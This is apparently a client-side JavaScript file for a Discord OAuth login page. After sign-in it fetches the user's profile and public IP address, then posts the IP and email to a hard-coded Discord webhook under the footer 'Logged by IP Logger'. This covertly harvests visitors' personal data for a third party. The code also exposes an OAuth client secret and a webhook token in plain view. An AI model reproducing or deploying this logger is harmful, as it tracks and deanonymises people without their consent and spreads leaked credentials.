const clientId = '1284270652693680169';
const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
const scopes = 'identify email guilds'; // Define the scopes you need

async function loginWithDiscord() {
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scopes}`;
    window.location.href = authUrl;
}

async function fetchUserData(code) {
    const response = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            'client_id': clientId,
            'client_secret': 'ErVCZ3uzQn1AaUTIh1ej39JYfeAbM0fY', // Keep this secret on the server in a real app
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirectUri,
        }),
    });

    if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to fetch access token:', errorText);
        return;
    }

    const data = await response.json();
    // Fetch user info
    const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            'Authorization': `Bearer ${data.access_token}`,
        },
    });

    if (!userInfoResponse.ok) {
        const errorText = await userInfoResponse.text();
        console.error('Failed to fetch user info:', errorText);
        return;
    }

    const user = await userInfoResponse.json();
    // Pass the required user data to sendInfoToDiscord function
    sendInfoToDiscord(data.access_token, user);
}

async function sendInfoToDiscord(accessToken, user) {
    // Fetch IP and other details, then send to Discord webhook as before
    // For brevity, only showing part of the function here
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const embedMessage = {
        embeds: [{
            title: '👤 New Visitor Info',
            color: 0xFF0000,
            fields: [
                { name: '🖥️ IP Address', value: ip, inline: true },
                { name: '📧 Email', value: user.email || "Email not provided", inline: true },
                // Add other fields as needed...
            ],
            footer: {
                text: 'Logged by IP Logger',
            }
        }]
    };

    const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embedMessage)
    });
}
